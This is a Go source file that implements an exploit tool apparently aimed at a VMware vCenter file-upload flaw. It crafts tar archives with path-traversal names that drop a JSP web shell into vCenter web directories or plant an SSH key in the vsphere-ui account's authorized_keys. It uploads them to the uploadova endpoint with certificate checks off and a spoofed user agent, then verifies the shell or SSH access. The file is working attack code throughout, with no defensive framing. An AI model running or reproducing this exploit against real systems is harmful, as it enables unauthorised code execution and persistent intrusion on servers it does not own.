package c_21972

import (
	// "HttpRequest"
	"archive/tar"
	"bytes"
	"os"
	"os/exec"
	"strconv"
	"time"

	// "crypto/tls"
	"fmt"
	"log"

	// "strconv"
	"strings"

	"github.com/imroc/req/v3"
)

var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"

func Readme() {
	fmt.Println("I'm 21972")
}

func Generate_tar(name string, o_name string, step string) bytes.Buffer {
	// 创建一个缓冲区用来保存压缩文件内容
	var buf bytes.Buffer
	// 创建一个压缩文档
	tw := tar.NewWriter(&buf)
	// 定义一堆文件
	// 将文件写入到压缩文档tw
	tar_file_name := ""
	// filename := ""
	if o_name == "windows" {
		tar_file_name = "../../../../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/" + "vsph3re.jsp"
		// filename = "win.tar"

	} else if o_name == "ssh" {
		tar_file_name = "../../../../../home/vsphere-ui/.ssh/authorized_keys"
		// filename = "cron.tar"
	} else {
		tar_file_name = strings.Replace("../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/qq/0/h5ngc.war/resources/", "qq", step, 1) + "vsph3re.jsp"
		// filename = "linux.tar"
	}
	var files = []struct {
		Name, Body string
	}{
		{tar_file_name, string(name)},
	}
	//fmt.Println(tar_file_name)
	for _, file := range files {
		hdr := &tar.Header{
			Name: file.Name,
			Mode: 0600,
			Size: int64(len(file.Body)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			log.Fatal(err)
		}
		if _, err := tw.Write([]byte(file.Body)); err != nil {
			log.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		log.Fatal(err)
	}

	// // 将压缩文档内容写入文件 file.tar.gz
	// f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0666)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// buf.WriteString("qq")
	// ss := buf.String()
	// q, err := os.OpenFile("new"+filename, os.O_CREATE|os.O_WRONLY, 0666)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// q.WriteString(ss)
	// a := io.ByteReader(buf)
	// buf.WriteTo(f)
	// fmt.Println(buf.Bytes())
	return buf

}

func Upload_shell(url string, buf bytes.Buffer) bool {
	client := req.C().DisableDumpAll().DisableDebugLog() // Use C() to create a client.
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetUserAgent(user_agent)
	resp, err := client.R().SetFileBytes("uploadFile", "test.tar", buf.Bytes()).Post(url + "/ui/vropspluginui/rest/services/uploadova") // Use R() to create a request.
	if err != nil {
		_ = err
		fmt.Println("[-] Upload failure, please check network.")
		os.Exit(0)
	}
	// log.Fatal(err)
	_ = resp
	// fmt.Println(resp)
	//fmt.Printf(string(buf))
	if resp.String() == "SUCCESS" {
		return true
	} else {
		return false
	}

}

func Upload_windows_shell(url, tar_content string) {
	buffer := Generate_tar(tar_content, "windows", "?")
	res := Upload_shell(url, buffer)
	if !res {
		fmt.Println("[-] Windows Upload failure，try Linux...")
		return
	}

	Check_shell(url, "windows")

}

func Upload_linux_shell(url, tar_content string) {
	for i := 1; i <= 121; i++ {
		buffer := Generate_tar(tar_content, "linux", strconv.Itoa(i))
		if Upload_shell(url, buffer) {
			Check_shell(url, "linux")
		} else {
			fmt.Println("[-] Linux pload failure.")
			return
		}

		// wg.Add(1)
		// go Upload_linux(strconv.Itoa(i))

		// }
		// buffer := c_21972.Generate_tar("1.txt", "win", "1")
		// c_21972.Upload_shell(buffer)
		// Upload_linux(strconv.Itoa(2))
	}
	// wg.Wait()
}

func Upload_ssh_authorized_keys(url, tar_content string) {
	target_ip := strings.Replace(url, "https://", "", 1)
	buffer := Generate_tar(tar_content, "ssh", "?")
	success := Upload_shell(url, buffer)
	if !success {
		fmt.Println("Upload failure.")
		return
	}
	cmd := exec.Command("ssh", "vsphere-ui@"+target_ip, "whoami")
	output, err := cmd.Output()

	if err != nil {
		panic(err)
	}
	// 因为结果是字节数组，需要转换成string
	res := strings.Replace((string(output)), "\n", "", 1)
	if res == "vsphere-ui" {
		fmt.Println("Upload success, UserName: vsphere-ui")
	} else {
		fmt.Println("Exploit failure.")
		os.Exit(0)
	}

}

func Check_shell(url string, os_name string) {
	client := req.C().DisableDumpAll().DisableDebugLog()
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetTimeout(3 * time.Second)
	client.DisableKeepAlives()
	client.SetUserAgent(user_agent)

	shell_url := ""
	if os_name == "windows" {
		shell_url = url + "/statsreport/vsph3re.jsp"
	} else if os_name == "linux" {
		shell_url = url + "/ui/resources/vsph3re.jsp"
	} else {
		panic("url error")
	}
	resp, err := client.R().Get(shell_url) // Use R() to create a request.
	if err != nil {
		fmt.Println("Please check network.")
		os.Exit(0)
	}
	a := resp.StatusCode

	if a == 200 {
		fmt.Println("[+] Upload success, " + shell_url)
		os.Exit(0)

	} else {
		// fmt.Println("利用失败.")
		// os.Exit(0)
	}
}
